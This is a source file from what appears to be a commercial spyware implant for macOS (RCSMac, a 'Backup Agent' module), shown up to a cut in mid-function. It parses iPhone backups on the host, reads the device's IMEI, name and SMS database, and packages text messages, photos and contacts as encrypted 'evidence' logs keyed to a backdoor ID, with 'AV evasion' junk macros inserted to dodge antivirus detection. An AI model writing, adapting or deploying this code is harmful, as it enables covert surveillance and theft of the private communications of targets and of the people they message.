/*
 * RCSMAgentBkups.m
 * RCSMac
 * Backup Agent
 *
 *
 * Created by J on 25/02/2015
 * Copyright (C) HT srl 2015. All rights reserved
 *
 */

// This module has been written mostly in C

#import "RCSMAgentBkups.h"
#import "RCSMCommon.h"
#import "RCSMGlobals.h"
#import "RCSMLogger.h"
#import "RCSMAVGarbage.h"
#import "RCSMAgentOrganizer.h"
#import <dlfcn.h>
#import <sqlite3.h>

#import "SBJson.h"

#include <stdio.h>
#include <dirent.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

#include <CommonCrypto/CommonDigest.h>
#define SHA1 CC_SHA1
#define SHA_DIGEST_LENGTH CC_SHA1_DIGEST_LENGTH

#define IN_SMS        2
#define OUT_SMS       3
#define TimeIntervalSince1970 978307200.0
#define WA_CHAT       0x00000006
#define SKYPE_CHAT    0x00000001
#define VIBER_CHAT    0x00000009
#define MESSAGES_CHAT 0x00000010

#define MAX_FILE_SIZE  (25 *  1024 * 1024)
// TODO: move in a common header
#define LOGTYPE_MMCHAT 0xc6c9
#define LOGTYPE_PHOTO 0xf070
#define LOGTYPE_SMS 0x0213
#define LOGTYPE_CALL_LIST 0x0231
#define LOGTYPE_PROXY_EV 0xabcd

#define SYNCTYPE_START 1
#define SYNCTYPE_STOP  2

short unicodeNullTerminator = 0x0000;
unsigned int delimiter = LOG_DELIMITER;

//char gWAusername[128];
char imei[16];
char phoneName[128];

typedef struct contactRecord
{
    char *firstName;
    char *lastName;
    char *socialHandle;
    char *mobile;
    char *email;
    int program;
    int local;   // 1 if it's my telephone number, 0 otherwise
} contactRecord;

typedef struct callRecord
{
    char *address;
    int duration;
    int flags;       // incoming = 1, outgoing = 0
    int program;     // 0x00 => :phone, 0x01 => :skype, 0x02 => :viber,
    long epochTime;
    struct callRecord *next;
} callRecord;

// accessory structure used in chat parsing
typedef struct chatRecord
{
    char *from;
    char *to;
    char *text;
    int flags;   // incoming = 1, outgoing = 0
    int type;    // whatsapp, skype, viber....
    long epochTime;
    struct chatRecord *next;
} chatRecord;

// accessory structure used in chat parsing
typedef struct attachRecord
{
    char *from;
    char *to;
    char *filename;
    char *transferName;
    char *mimeType;
    int flags;   // incoming = 1, outgoing = 0
    int type;    // whatsapp, skype, viber....
    long epochTime;
    
} attachRecord;

// accessory structure used in photos parsing
typedef struct photoRecord
{
    char *photoName;
    char *bkupName;
    long epochTime;
} photoRecord;

// accessory structure used in sms.db parsing
typedef struct smsRecord
{
    char *from;
    char *to;
    char *text;
    int flags;
    long epochTime;
    
} smsRecord;

// accessory structure used in Manifest.mbdb parsing
typedef struct mbdbRecord
{
    char *sha1;
    char *filename;
    struct mbdbRecord *next;
    
} mbdbRecord;


void freeMbdbRecord(mbdbRecord *record)
{
    if(record != NULL)
    {
        free(record->sha1);
        free(record->filename);
        free(record);
    }
}

void deleteMbdbRecordList(mbdbRecord *headRef)
{
    mbdbRecord *current = headRef;
    mbdbRecord *next;
    while (current != NULL)
    {
        next = current->next;
        freeMbdbRecord(current);
        current = next;
    }
}

void freeChatRecord(chatRecord *record)
{
    if(record != NULL)
    {
        free(record->from);
        free(record->to);
        free(record->text);
        free(record);
    }
}

void deleteChatRecordList(chatRecord *headRef)
{
    chatRecord *current = headRef;
    chatRecord *next;
    while (current != NULL)
    {
        next = current->next;
        freeChatRecord(current);
        current = next;
    }
}

void freeCallRecord(callRecord *record)
{
    if(record != NULL)
    {
        free(record->address);
        free(record);
    }
}

void deleteCallRecordList(callRecord *headRef)
{
    callRecord *current = headRef;
    callRecord *next;
    while (current != NULL)
    {
        next = current->next;
        freeCallRecord(current);
        current = next;
    }
}


// obtain string from exdecimal array
char* stringFromHex(unsigned char byteArray[])
{
    char *hexString = (char *)calloc((2*SHA_DIGEST_LENGTH)+1,sizeof(char));
    for (int i=0; i<SHA_DIGEST_LENGTH; ++i)
    {
        sprintf(hexString+2*i,"%02X",byteArray[i]);
    }
    return hexString;
}

// free array of backup directories
void freeBkupArray(char **array)
{
    if(array != NULL)
    {
        int i=0;
        while (*(array+i) != NULL)
        {
            free(*(array+i));
            ++i;
        }
        free(array);
    }
}

// retrieve string from buffer, first 2 bytes contain string length
int getString(char **string,char *buffer)
{
    uint16_t len = ntohs(*((uint16_t*)buffer));
    if (len != 0xffff)
    {
        *string = calloc(len+1,sizeof(uint8_t));
        if(*string != NULL)
        {
            strncpy(*string, buffer+2, len);
        }
        
        return len+2;
    }
    else
        return 2;
}

int parseInfoFile(char *udidPath)
{
    // retrieve Info.plist file path
    if (udidPath == NULL)
    {
        return -1;
    }
    
    char *completePath = malloc(sizeof(char)*(strlen(udidPath)+strlen("Manifest.mbdb")+strlen("/"))+1);
    if (completePath == NULL)
    {
        return -1;
    }
    
    if(sprintf(completePath,"%s/%s",udidPath,"Info.plist") < 0)
    {
        free(completePath);
        return -1;
    }

    memset(imei,0,16);
    memset(phoneName,0,128);
    
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    NSString *plistFile = [NSString stringWithUTF8String:completePath];
#ifdef DEBUG_BKUPS
    infoLog(@"plist file: %@",plistFile);
#endif
    NSDictionary *theDict = [NSDictionary dictionaryWithContentsOfFile:plistFile];
    if (theDict != nil)
    {
        NSString *imeiString = [theDict objectForKey:@"IMEI"];
        NSString *phoneNameString = [theDict objectForKey:@"Device Name"];
        if((imeiString != nil) && (phoneNameString != nil))
        {
            const char *imeiChar = [imeiString UTF8String];
            strcpy(imei,imeiChar);
            const char *phoneNameChar = [phoneNameString UTF8String];
            strcpy(phoneName,phoneNameChar);
#ifdef DEBUG_BKUPS
            infoLog(@"imei: %s",imei);
            infoLog(@"device name: %s",phoneName);
#endif
            
        }
    }
    
    [pool release];
    return 1;
}

// parse mbdb file given UDID path and create linked list of info
int parseMbdbFile(mbdbRecord **head, char *udidPath)
{
    // retrieve mbdb file path
    if (udidPath == NULL)
    {
        return -1;
    }
    
    char *completePath = malloc(sizeof(char)*(strlen(udidPath)+strlen("Manifest.mbdb")+strlen("/"))+1);
    if (completePath == NULL)
    {
        return -1;
    }
    
    if(sprintf(completePath,"%s/%s",udidPath,"Manifest.mbdb") < 0)
    {
        free(completePath);
        return -1;
    }
    
    // open file
    int fd = open(completePath, O_RDONLY);
    if ( fd < 0 )
    {
        free(completePath);
        return -1;
    }
    
    free(completePath);
    
    // read file
    struct stat fd_stat;
    if(fstat(fd, &fd_stat) <0)
    {
        close(fd);
        return -1;
    }
    char *buff = NULL;
    if((buff=malloc(fd_stat.st_size)) == NULL)
    {
        close(fd);
        return -1;
    }
    int n;
    if((n=read(fd, buff, fd_stat.st_size))<0)
    {
        close(fd);
        free(buff);
        return -1;
    }
    
    // close file
    close(fd);
    
    // parse
    // take signature
    char signature[6];
    memcpy(signature,buff,6);
    if (strncmp(signature,"mbdb",4)!=0)
    {
        // not an mbdb file
        free(buff);
        return -1;
    }
    // start cycling on mbdb file
    int i =6;
    while(i < fd_stat.st_size)
    {
        // retrieve domain string
        char *domain = NULL;
        int len = getString(&domain,buff+i);
        i = i+len;
        
        // retrieve path string
        char *path = NULL;
        len = getString(&path,buff+i);
        i = i+len;
        
        // retrieve backup filename: sha1 of "domain - path"
        char *gluedName=NULL;
        gluedName = calloc(strlen(domain) + strlen(path) + strlen("-") + 1,sizeof(char));
        sprintf(gluedName,"%s-%s",domain,path);
        unsigned char hash[SHA_DIGEST_LENGTH];
        SHA1((const unsigned char*)gluedName, strlen(gluedName), hash);
        free(gluedName);
        free(domain);
        
        char *hashString = stringFromHex(hash);
        if (hashString == NULL)
        {
            free(path);
            continue;
        }
        char *completeHash = calloc(strlen(udidPath)+strlen("/")+2*SHA_DIGEST_LENGTH+1,sizeof(char));
        if (completeHash == NULL)
        {
            free(hashString);
            free(path);
            continue;
        }
        if (sprintf(completeHash,"%s/%s",udidPath,hashString)<0)
        {
            free(completeHash);
            free(hashString);
            free(path);
            continue;
        }
        free(hashString);
        
        // retrieve target
        char *target = NULL;
        len = getString(&target,buff+i);
        free(target);
        i = i+len;
        
        // retrieve digest
        char *digest = NULL;
        len = getString(&digest,buff+i);
        free(digest);
        i = i+len;
        
        // retrieve key
        char *key = NULL;
        len = getString(&key,buff+i);
        free(key);
        i = i+len;
        
        // mode: 0x8XXX is a regular file
        int isFile = 0;
        if(((uint8_t)*(buff+i) & 0xf0)==0x80)
        {
            isFile = 1;
        }
        /*
         i += 2; // mode
         i += 8; // inode
         i += 4; // user id
         i += 4; // group id
         i += 4; // last modified time
         i += 4; // last accessed time
         i += 4; // creation time
         i += 8; // size
         i += 1; // protection class
         */
        i += 39;
        if (isFile)
        {
            mbdbRecord *newRecord = calloc(1,sizeof(mbdbRecord));
            if (newRecord != NULL)
            {
                if (completeHash!=NULL)
                {
                    if((newRecord->sha1 = calloc(strlen(completeHash)+1,sizeof(char)))!=NULL)
                    {
                        strcpy(newRecord->sha1,completeHash);
                    }
                }
                if (path!=NULL)
                {
                    if((newRecord->filename = calloc(strlen(path)+1,sizeof(char)))!=NULL)
                    {
                        strcpy(newRecord->filename,path);
                    }
                }
                newRecord->next = *head;
                *head = newRecord;
            }
        }
        
        free(path);
        free(completeHash);
        // retrieve num of properties
        // every property is a couple name-value
        uint8_t prop_num = *(buff+i);
        i += 1;
        for(int j=0; j<prop_num; ++j)
        {
            char *name = NULL;
            len = getString(&name,buff+i);
            i = i+len;
            
            char *value = NULL;
            len = getString(&value,buff+i);
            i = i+len;
            
            free(name);
            free(value);
        }
    }
    
    free(buff);
    
    return 1;
}

// give back backups home: "<home dir>/Library/Application Support/MobileSync/Backup"
// this function is platform specific
// remember to free memory
char* getBkupsHome()
{
    // retrieve Application Support directory
    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSApplicationSupportDirectory, NSUserDomainMask, YES);
    NSString *applicationSupportDirectory = [paths firstObject]; // no / at the end
    // complete the path
    NSString *bkupsHome = [NSString stringWithFormat:@"%@/%@", applicationSupportDirectory, @"MobileSync/Backup"];
    // convert
    const char *utf8 = [bkupsHome UTF8String];
    int l = strlen(utf8);
    char *home = malloc(sizeof(char)*l+1);
    if (home != NULL)
    {
        strcpy(home,utf8);
    }
    return home;
}

// collect all bkup dirs and allocate an array of strings
// remember to free the array when finished
char** getBackupDirs(void)
{
    // backups are in:
    // <home dir>/Library/Application Support/MobileSync/Backup/<UDID>/
    
    char *bkupsDirName = getBkupsHome(); // <home dir>/Library/Application Support/MobileSync/Backup
    
    if (bkupsDirName == NULL)
    {
        return NULL;
    }
    
    DIR *bkupsDir;
    struct dirent *entry;
    
    if ((bkupsDir = opendir(bkupsDirName)) == NULL)
    {
        free(bkupsDirName);
        return NULL;
    }
    int count = 0;
    
    // find how many entries has the backup dir
    while ((entry = readdir(bkupsDir) )!= NULL)
    {
        if (entry->d_type == DT_DIR)
        {
            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
                continue;
            ++count;
        }
    }
    
    // allocate array
    char **dirArray = NULL;
    if (count >0)
    {
        dirArray = (char**)calloc(count+1,sizeof(char*));
    }
    
    if (dirArray != NULL)
    {
        // reset the position of the directory stream
        rewinddir(bkupsDir);
        // fill the array
        int i = 0;
        while ((entry = readdir(bkupsDir) )!= NULL)
        {
            if (entry->d_type == DT_DIR)
            {
                if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
                    continue;
                int len = sizeof(char)*(strlen(bkupsDirName)+strlen(entry->d_name)+strlen("/"));
                if((*(dirArray+i) = calloc(len+1,sizeof(char)))!=NULL)
                {
                    sprintf(*(dirArray+i),"%s/%s",bkupsDirName,entry->d_name);
                    ++i;
                }
            }
        }
    }
    
    // close the directory stream
    closedir(bkupsDir);
    
    // free mem
    free(bkupsDirName);
    
    return dirArray;
}

// return 1 if the string t occurs at the end of the string s, and 0 otherwise.
int strend(const char *s, const char *t)
{
    if ((s == NULL) || (t == NULL))
    {
        return 0;
    }
    size_t ls = strlen(s); // find length of s
    size_t lt = strlen(t); // find length of t
    if (ls >= lt)  // check if t can fit in s
    {
        // point s to where t should start and compare the strings from there
        return (0 == memcmp(t, s + (ls - lt), lt));
    }
    return 0; // t was longer than s
}

// platform specific code
void logSms(smsRecord *sms)
{
    if (sms == NULL)
    {
        return;
    }
    
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    NSMutableData *additionalHeader = [[NSMutableData alloc] initWithCapacity:0];
    // construct additional header
    uint32_t sms_version = 2010050501;
    uint32_t flags = sms->flags;
    [additionalHeader appendBytes:&sms_version length:sizeof(sms_version)];
    [additionalHeader appendBytes:&flags length:sizeof(flags)];
    int64_t winTime = ((int64_t)sms->epochTime * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
    uint32_t highDatetime = winTime >> 32;
    uint32_t lowDatetime = winTime & 0xFFFFFFFF;
    [additionalHeader appendBytes:&lowDatetime length:sizeof(lowDatetime)];
    [additionalHeader appendBytes:&highDatetime length:sizeof(highDatetime)];
    char from[16];
    char to[16];
    memset(from,0,16);
    memset(to, 0, 16);
    strcpy(from,sms->from);
    strcpy(to,sms->to);
    [additionalHeader appendBytes:&from length:sizeof(from)];
    [additionalHeader appendBytes:&to length:sizeof(to)];
    //construct data
    NSMutableData *logData = [[NSMutableData alloc] initWithCapacity:0];
    NSString *textString;
    if (sms->text != NULL)
    {
        textString = [NSString stringWithUTF8String:sms->text];
    }
    else
    {
        textString = @" ";
    }
    [logData appendData:[textString dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
    [logData appendBytes:&unicodeNullTerminator length:sizeof(short)];
 
    __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
    
    NSMutableData *encryptedData = [logManager prepareDataToLog:logData evidenceHeader:additionalHeader forAgentID:LOGTYPE_SMS];
    
    if(encryptedData !=nil)
    {
        SBJsonWriter *writer = [[SBJsonWriter alloc] init];
        
        // additional header
        NSMutableData *jsonAddHeader = [[NSMutableData alloc] initWithCapacity:0];
        uint32_t version = 2015040801;
        [jsonAddHeader appendBytes:&version length:sizeof(uint32_t)];
        NSMutableDictionary *dictHeader = [NSMutableDictionary dictionary];
        [dictHeader setObject:@"ios" forKey:@"platform"];
        NSString *bIdString = [NSString stringWithUTF8String:gBackdoorID];
        [dictHeader setObject:bIdString forKey:@"ident"];
        NSString *imeiString = [NSString stringWithUTF8String:imei];
        [dictHeader setObject:imeiString forKey:@"instance"];
        [dictHeader setObject:@"evidence" forKey:@"type"];
        NSString *jsonHeaderString = [writer stringWithObject:dictHeader];
        [jsonAddHeader appendData:[jsonHeaderString dataUsingEncoding:NSUTF8StringEncoding]];
        
        // content is encrypted data
        
        // log
        BOOL success = [logManager createLog: LOGTYPE_PROXY_EV
                                 agentHeader: jsonAddHeader
                                   withLogID: 0];
        
        if (success)
        {
            [logManager writeDataToLog: encryptedData
                              forAgent: LOGTYPE_PROXY_EV
                             withLogID: 0];
            // AV evasion: only on release build
            AV_GARBAGE_001
            
            [logManager closeActiveLog: LOGTYPE_PROXY_EV
                             withLogID: 0];
            
            // AV evasion: only on release build
            AV_GARBAGE_004
        }
        
        // clean
        [writer release];
        [jsonAddHeader release];
        [encryptedData release];
    }

    [logData release];
    [additionalHeader release];
    [pool release];
/*
#ifdef DEBUG_BKUPS
    infoLog(@"****");
    infoLog(@"From: %s", sms->from);
    infoLog(@"To: %s", sms->to);
    infoLog(@"Text: %s", sms->text);
    infoLog(@"Flags: %d", sms->flags);
    infoLog(@"Epoch: %ld", sms->epochTime);
#endif*/
}

// retrieve data from sms sqlite db
int parseSmsDb(char *dbName, long epochMarkup)
{
    sqlite3       *db = NULL;
    int           nrow = 0, ncol = 0;
    int           osVer = 0;
    long          date = 0;
    char          *szErr;
    char          **result;
    
    char          sql_query_curr[1024];
    char          sql_query_ios3[] = "select date,address,text,flags,ROWID from message";
    char          sql_query_ios6[] = "select message.date,chat.chat_identifier, message.text, message.is_from_me,message.rowid from message inner join chat_message_join on chat_message_join.message_id = message.rowid inner join chat on chat_message_join.chat_id = chat.rowid where message.service = 'SMS' and ";
    
    // open db
    if (sqlite3_open(dbName, &db))
    {
        sqlite3_close(db);
        return -1;
    }
    
    // first, try query as version  6
    if ((date = (epochMarkup - TimeIntervalSince1970)) <0 )  // in ios >= 6, date is in mac absolute time
    {
        date = 1;
    }
    sprintf(sql_query_curr, "%s where message.date >= %ld", sql_query_ios6, date);
    
    if (sqlite3_get_table(db, sql_query_curr, &result, &nrow, &ncol, &szErr) != SQLITE_OK)
    {
        sqlite3_free_table(result);
        free(szErr);
        date = epochMarkup;
        sprintf(sql_query_curr, "%s where message.date >= %ld", sql_query_ios3, date);
        if (sqlite3_get_table(db, sql_query_curr, &result, &nrow, &ncol, &szErr) != SQLITE_OK)
        {
            sqlite3_free_table(result);
            free(szErr);
            sqlite3_close(db);
            return -1;
        }
    }
    else
    {
        osVer = 6;
    }
    
    // close db
    sqlite3_close(db);
    
    // Only if we got some msg...
    if (ncol * nrow > 0)
    {
        for (int i = 0; i< nrow * ncol; i += 5)
        {
            smsRecord newRecord;
            
            // flags == 2 -> in mesg; flags == 3 -> out mesg; flags == 33,35 out msg not sent
            int flags = 0;
            char *__flags = result[ncol + i + 3] == NULL ? "0" : result[ncol + i + 3];
            
            sscanf(__flags, "%d", &flags);
            
            switch (flags)
            {
                case IN_SMS:  // "flags" column in os version <6
                case 0:       // "is_from_me" column in os version >= 6
                {
                    if (result[ncol + i + 1] != NULL)
                        newRecord.from = result[ncol + i + 1];
                    else
                        newRecord.from = NULL;
                    
                    newRecord.flags = 1;
                    newRecord.to = "target";  // local // TODO: insert phone number if/when possible
                    break;
                }
                case OUT_SMS: // "flags" column in os version <6
                case 33:      // "flags" column in os version <6
                case 35:      // "flags" column in os version <6
                case 1:       // "is_from_me" column in os version >= 6
                {
                    if (result[ncol + i + 1] != NULL)
                        newRecord.to = result[ncol + i + 1];
                    else
                        newRecord.to = NULL;
                    newRecord.flags = 0;
                    newRecord.from = "target"; // me // TODO: insert phone number if/when possible
                    break;
                }
                default:
                    break;
            }
            
            // text of the sms
            newRecord.text = result[ncol + i + 2] == NULL ? NULL : result[ncol + i + 2];
            
            // timestamp of the sms
            long ts;
            char *_ts  = result[ncol + i] == NULL ? "0" : result[ncol + i];
            sscanf(_ts, "%ld", &ts);
            newRecord.epochTime = ts;
            if (osVer >= 6)
            {
                newRecord.epochTime += TimeIntervalSince1970;
            }
            
            // log sms
            logSms(&newRecord);
            
        }
    }
    
    // free result table
    sqlite3_free_table(result);
    
    return 1;
}

int collectSms(mbdbRecord *head, long epochMarkup)
{
    if (head == NULL)
    {
        return -1;
    }
    mbdbRecord *current = head;
    while (current!=NULL)
    {
        if (strend(current->filename,"sms.db"))
        {
#ifdef DEBUG_BKUPS
            infoLog(@"found sms db\n");
            infoLog(@"filename: %s\n",current->sha1);
#endif
            parseSmsDb(current->sha1, epochMarkup);
            return 1;
        }
        current = current->next;
    }
    return -1;
}

// platform specific code
void logPhoto(photoRecord *photo)
{
    if (photo == NULL)
        return;
    if (photo->bkupName == NULL)
        return;
    
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    NSString *fnString = [NSString stringWithUTF8String:photo->bkupName];
    unsigned long long fileSize = 0;
    fileSize = [[[NSFileManager defaultManager] attributesOfItemAtPath:fnString error:nil] fileSize];
    if ((fileSize == 0) || (fileSize > MAX_FILE_SIZE))
    {
        [pool release];
        return;
    }
    
    // additional header
    NSMutableData *additionalHeader = [[NSMutableData alloc] initWithCapacity:0];
    uint32_t version = 2015012601;
    [additionalHeader appendBytes:&version length:sizeof(uint32_t)];
    NSString *name = NULL;
    NSString *bkpName = NULL;
    if (photo->photoName != NULL )
    {
        name = [NSString stringWithUTF8String:photo->photoName];
    }
    else
    {
        name = @" ";
    }
    if (photo->bkupName != NULL )
    {
        bkpName = [NSString stringWithUTF8String:photo->bkupName];
    }
    else
    {
        bkpName = @" ";
    }
    NSNumber *date = [NSNumber numberWithLong:photo->epochTime];
    NSMutableDictionary *dict = [NSMutableDictionary dictionary];
    [dict setObject:name forKey:@"description"];
    [dict setObject:bkpName forKey:@"path"];
    [dict setObject:date forKey:@"time"];
    [dict setObject:@"Photos" forKey:@"program"];
    SBJsonWriter *writer = [[SBJsonWriter alloc] init];
    NSString *jsonString = [writer stringWithObject:dict];
    [additionalHeader appendData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];
    [writer release];
    
    // content
    NSMutableData *logData = [NSMutableData dataWithContentsOfFile:fnString];
    
    // log
    if (logData != nil)
    {
        __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
        
        NSMutableData *encryptedData = [logManager prepareDataToLog:logData evidenceHeader:additionalHeader forAgentID:LOGTYPE_PHOTO];
        
        if(encryptedData !=nil)
        {
            SBJsonWriter *writer = [[SBJsonWriter alloc] init];
            
            // additional header
            NSMutableData *jsonAddHeader = [[NSMutableData alloc] initWithCapacity:0];
            uint32_t version = 2015040801;
            [jsonAddHeader appendBytes:&version length:sizeof(uint32_t)];
            NSMutableDictionary *dictHeader = [NSMutableDictionary dictionary];
            [dictHeader setObject:@"ios" forKey:@"platform"];
            NSString *bIdString = [NSString stringWithUTF8String:gBackdoorID];
            [dictHeader setObject:bIdString forKey:@"ident"];
            NSString *imeiString = [NSString stringWithUTF8String:imei];
            [dictHeader setObject:imeiString forKey:@"instance"];
            [dictHeader setObject:@"evidence" forKey:@"type"];
            NSString *jsonHeaderString = [writer stringWithObject:dictHeader];
            [jsonAddHeader appendData:[jsonHeaderString dataUsingEncoding:NSUTF8StringEncoding]];
            
            // content is encrypted data
            
            // log
            BOOL success = [logManager createLog: LOGTYPE_PROXY_EV
                                     agentHeader: jsonAddHeader
                                       withLogID: 0];
            
            if (success)
            {
                [logManager writeDataToLog: encryptedData
                                  forAgent: LOGTYPE_PROXY_EV
                                 withLogID: 0];
                // AV evasion: only on release build
                AV_GARBAGE_001
                
                [logManager closeActiveLog: LOGTYPE_PROXY_EV
                                 withLogID: 0];
                
                // AV evasion: only on release build
                AV_GARBAGE_004
            }
            
            // clean
            [writer release];
            [jsonAddHeader release];
            [encryptedData release];
        }
        
    }

    [additionalHeader release];
    [pool release];

#ifdef DEBUG_BKUPS
     infoLog(@"****");
     infoLog(@"Photo name: %s", photo->photoName);
     infoLog(@"Backup name: %s", photo->bkupName);
     infoLog(@"Epoch: %ld", photo->epochTime);
#endif
    
}

int parsePhotosDb(mbdbRecord *head, char *dbName, long epochMarkup)
{
    sqlite3       *db = NULL;
    int           nrow = 0, ncol = 0;
    char          *szErr;
    char          **result;
    
    char          sql_query_curr[256];
    char          sql_query_ios5[] = "select ZFILENAME,ZDATECREATED from ZGENERICASSET";
    char          sql_query_ios4[] = "select filename,captureTime from Photo";
    
    // build real sql query
    long date = epochMarkup;
    if ((date -= TimeIntervalSince1970) < 0 )  // date in db is in mac absolute time
    {
        date = 1;
    }
    
    // open db
    if (sqlite3_open(dbName, &db))
    {
        sqlite3_close(db);
        return -1;
    }
    
    // first, try query as version  5
    sprintf(sql_query_curr, "%s where ZDATECREATED >= %ld", sql_query_ios5, date);
    
    if (sqlite3_get_table(db, sql_query_curr, &result, &nrow, &ncol, &szErr) != SQLITE_OK)
    {
        sqlite3_free_table(result);
        free(szErr);
        
        sprintf(sql_query_curr, "%s where captureTime >= %ld", sql_query_ios4, date);
        if (sqlite3_get_table(db, sql_query_curr, &result, &nrow, &ncol, &szErr) != SQLITE_OK)
        {
            sqlite3_free_table(result);
            free(szErr);
            sqlite3_close(db);
            return -1;
        }
    }
    
    // close db
    sqlite3_close(db);
    
    // Only if we got some photo...
    if (ncol * nrow > 0)
    {
        for (int i = 0; i< nrow * ncol; i += 2)
        {
            photoRecord newRecord;
            
            // photo name
            char *photoName = result[ncol + i] == NULL ? NULL : result[ncol + i];
            newRecord.photoName = photoName;
            
            // timestamp of the photo
            long ts;
            char *_ts  = result[ncol + i + 1] == NULL ? "0" : result[ncol + i + 1];
            sscanf(_ts, "%ld", &ts);
            newRecord.epochTime = ts+TimeIntervalSince1970;
            
            // photo backupname
            mbdbRecord *current = head;
            int found = 0;
            while (current!=NULL && !found)
            {
                if (strend(current->filename,photoName))
                {
                    newRecord.bkupName = current->sha1;
                    found = 1;
                }
                current = current->next;
            }
            
            // log photo
            logPhoto(&newRecord);
        }
    }
    
    // free result table
    sqlite3_free_table(result);
    
    return 1;
}

int collectPhotos(mbdbRecord *head, long epochMarkup)
{
    if (head == NULL)
    {
        return -1;
    }
    
    mbdbRecord *current = head;
    while (current!=NULL)
    {
        if (strend(current->filename,"Photos.sqlite"))
        {
#ifdef DEBUG_BKUPS
            infoLog(@"found photos db\n");
            infoLog(@"filename: %s\n",current->sha1);
#endif
            parsePhotosDb(head, current->sha1, epochMarkup);
            return 1;
        }
        current = current->next;
    }
    return -1;
}


void logContacts(contactRecord *rec)
{
    if (rec == NULL)
    {
        return;
    }
    
#ifdef DEBUG_BKUPS
    infoLog(@"****\n");
    infoLog(@"First name: %s\n", rec->firstName);
    infoLog(@"Last name: %s\n", rec->lastName);
    infoLog(@"Social handle: %s\n", rec->socialHandle);
    infoLog(@"Mobile: %s\n", rec->mobile);
    infoLog(@"Email: %s\n", rec->email);
#endif
    
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    NSMutableData *logData = [[NSMutableData alloc] initWithCapacity:0];
    
    // content
    NSMutableData *contentLog = [[NSMutableData alloc] initWithCapacity:0];
    
    if (rec->firstName != NULL)
    {
        NSString *firstString = [NSString stringWithUTF8String:rec->firstName];
        NSData *firstData = [firstString dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
        u_int elemSize = [firstData length];
        u_int tag = FirstName << 24;
        tag |= (elemSize & 0x00FFFFFF);
        [contentLog appendBytes: &tag
                         length: sizeof(u_int)];
        [contentLog appendData: firstData];
        
    }
    if (rec->lastName != NULL)
    {
        NSString *lastString = [NSString stringWithUTF8String:rec->lastName];
        NSData *lastData = [lastString dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
        u_int elemSize = [lastData length];
        u_int tag = LastName << 24;
        tag |= (elemSize & 0x00FFFFFF);
        [contentLog appendBytes: &tag
                         length: sizeof(u_int)];
        [contentLog appendData: lastData];
    }
    if (rec->socialHandle != NULL)
    {
        NSString *socialString = [NSString stringWithUTF8String:rec->socialHandle];
        NSData *socialData = [socialString dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
        u_int elemSize = [socialData length];
        u_int tag = SocialHandle << 24;
        tag |= (elemSize & 0x00FFFFFF);
        [contentLog appendBytes: &tag
                         length: sizeof(u_int)];
        [contentLog appendData: socialData];
    }
    if (rec->mobile != NULL)
    {
        NSString *mobileString = [NSString stringWithUTF8String:rec->mobile];
        NSArray *chunks = [mobileString componentsSeparatedByString: @","];
        for (NSString *chunk in chunks)
        {
            NSData *mobileData = [chunk dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
            u_int elemSize = [mobileData length];
            u_int tag = MobileTelephoneNumber << 24;
            tag |= (elemSize & 0x00FFFFFF);
            [contentLog appendBytes: &tag
                             length: sizeof(u_int)];
            [contentLog appendData: mobileData];
        }
    }
    if (rec->email != NULL)
    {
        NSString *mailString = [NSString stringWithUTF8String:rec->email];
        NSArray *chunks = [mailString componentsSeparatedByString: @","];
        for (NSString *chunk in chunks)
        {
            NSData *mailData = [chunk dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
            u_int elemSize = [mailData length];
            u_int tag = Email1Address << 24;
            tag |= (elemSize & 0x00FFFFFF);
            [contentLog appendBytes: &tag
                             length: sizeof(u_int)];
            [contentLog appendData: mailData];
        }
    }
    
    // header
    NSMutableData *logHeader = [[NSMutableData alloc] initWithLength: sizeof(organizerAdditionalHeader)];
    organizerAdditionalHeader *additionalHeader = (organizerAdditionalHeader *)[logHeader bytes];;
    
    additionalHeader->size    = sizeof(organizerAdditionalHeader) + [contentLog length];
    additionalHeader->version = CONTACT_LOG_VERSION_NEW;
    additionalHeader->identifier  = 0;
    additionalHeader->program     = rec->program;
    additionalHeader->flags       = (rec->local==1)? 0x80000000 : 0x00000000;
    
    [logData appendData:logHeader];
    [logData appendData:contentLog];
    
    if ([logData length] >0)
    {
        __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
        
        NSMutableData *encryptedData = [logManager prepareDataToLog:logData evidenceHeader:nil forAgentID:AGENT_ORGANIZER];
        
        if(encryptedData !=nil)
        {
            SBJsonWriter *writer = [[SBJsonWriter alloc] init];
            
            // additional header
            NSMutableData *jsonAddHeader = [[NSMutableData alloc] initWithCapacity:0];
            uint32_t version = 2015040801;
            [jsonAddHeader appendBytes:&version length:sizeof(uint32_t)];
            NSMutableDictionary *dictHeader = [NSMutableDictionary dictionary];
            [dictHeader setObject:@"ios" forKey:@"platform"];
            NSString *bIdString = [NSString stringWithUTF8String:gBackdoorID];
            [dictHeader setObject:bIdString forKey:@"ident"];
            NSString *imeiString = [NSString stringWithUTF8String:imei];
            [dictHeader setObject:imeiString forKey:@"instance"];
            [dictHeader setObject:@"evidence" forKey:@"type"];
            NSString *jsonHeaderString = [writer stringWithObject:dictHeader];
            [jsonAddHeader appendData:[jsonHeaderString dataUsingEncoding:NSUTF8StringEncoding]];
            
            // content is encrypted data
            
            // log
            BOOL success = [logManager createLog: LOGTYPE_PROXY_EV
                                     agentHeader: jsonAddHeader
                                       withLogID: 0];
            
            if (success)
            {
                [logManager writeDataToLog: encryptedData
                                  forAgent: LOGTYPE_PROXY_EV
                                 withLogID: 0];
                // AV evasion: only on release build
                AV_GARBAGE_001
                
                [logManager closeActiveLog: LOGTYPE_PROXY_EV
                                 withLogID: 0];
                
                // AV evasion: only on release build
                AV_GARBAGE_004
            }
            
